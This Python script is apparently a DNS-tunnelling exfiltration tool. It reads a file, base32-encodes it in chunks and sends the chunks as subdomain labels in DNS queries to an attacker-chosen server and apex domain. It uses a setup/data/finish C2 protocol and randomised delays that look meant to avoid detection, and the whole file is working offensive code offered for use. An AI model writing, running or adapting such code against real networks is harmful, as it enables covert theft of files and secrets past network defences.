"""
### extract a file using DNS

###
"""

import base64
import uuid
import os, random
from xmlrpc.client import boolean
import dns.message
import dns.asyncquery
import dns.asyncresolver
from dns.exception import Timeout
import time, argparse


file_uuid_str = f'{uuid.uuid4()}'
def send_file_dns_over_udp(filename: str, dns_server: str):

    
    file = open(filename,"rb")
    #data = file.read()
    file_b32_str_list = []  #list of base 32 encoded file chunks
    counter = 0
    while True:
        data = file.read(34)
        if not data:
            break
        b32_byte = base64.b32encode(data)
        b32_str = b32_byte.decode('utf-8')
        file_b32_str_list.append(b32_str)
        
    file.close()

    num_chunks = len(file_b32_str_list)

    """
    C2 codes
    A = setup query
    D = data query
    Z = file upload finished
    1. send setup_query, coded with A and number of file chunks
    2. send file_chunk_query, coded with D, each file chunk identified by its index
    3. send finish_query query with Z, denoting complete
    """

    setup_query =  f'{file_uuid_str}.A.{num_chunks}.0.{apex_domain}'
    send_plaintext_query(query=setup_query, dns_server=dns_server)
    time.sleep(1)
    counter = 0
    for chunk in file_b32_str_list:
        file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.{apex_domain}'
        send_plaintext_query(query=file_chunk_query, dns_server=dns_server)
        counter += 1
        # if not no_throttle_queries:
        time.sleep(random.uniform(0.5,1.5))
        #break   #remove this to send the full file

    finish_query = f'{file_uuid_str}.Z.{counter}.0.{apex_domain}'
    time.sleep(1)
    send_plaintext_query(query=finish_query,dns_server=dns_server)

    print("Done sending")


def send_plaintext_query(query: str, dns_server: str):
    """sends a query using the dnspython package to the c2 server. 
    """

    #https://dnspython.readthedocs.io/en/stable/query.html#dns.query.udp
    q = dns.message.make_query(query, 'A')
    server = dns_server
    try:
        r = dns.query.udp(q=q, where=server, timeout=.00001)
    except dns.exception.Timeout as e:
        print(f"sending: {query} to {server}")
        return  # this is expected, we don't care about the return query
    except Exception as e:
        print(e)



if __name__ == "__main__":
    
    ap = argparse.ArgumentParser()
    ap.add_argument('-f', '--filename', dest='file_to_send', type=str, help='The file you want to send using DNS tunneling')
    ap.add_argument('-d', '--dnsip' , dest="dns_server", type=str, help='The DNS server you want to send your secret data to.')
    ap.add_argument('-a', '--apexdomain' , dest="apex", type=str, help='The Apex domain...what you\'re going to use as an authoritatvie dns server.')

    args = vars(ap.parse_args())
    print(args)
    
    apex_domain = args['apex']
    # no_throttle_queries = args['query_throttling']

    send_file_dns_over_udp(filename=args['file_to_send'], dns_server=args['dns_server'])